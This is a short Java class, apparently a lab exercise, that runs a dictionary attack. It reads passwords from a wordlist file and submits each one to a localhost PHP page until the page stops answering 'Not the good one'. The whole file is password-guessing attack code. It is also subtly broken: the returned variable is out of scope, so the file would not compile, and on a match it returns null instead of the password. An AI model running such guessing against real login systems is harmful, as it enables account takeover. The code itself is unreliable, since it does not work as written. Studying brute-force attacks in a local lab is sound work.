import java.util.*;
import java.io.*;
import java.net.*;

public class Dictionary extends Attack {
   
    public String pwdCrack() throws Exception {
        InputStream document = new FileInputStream("dictionary.txt");

        try (Scanner obj = new Scanner(document)) {
            while (obj.hasNextLine()) {
                String pwd = obj.next();
                URL url = new URL("http://localhost/User.php?pwd=" + pwd);
                URLConnection connection = url.openConnection();

                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(connection.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null) {
                        System.out.println(pwd);
                        System.out.println(line);
                        if (line.equals("Not the good one")) {
                        } else {
                            return null;
                        }
                    }
                }
            }
            obj.close();
        }
        return pwd;
    }
}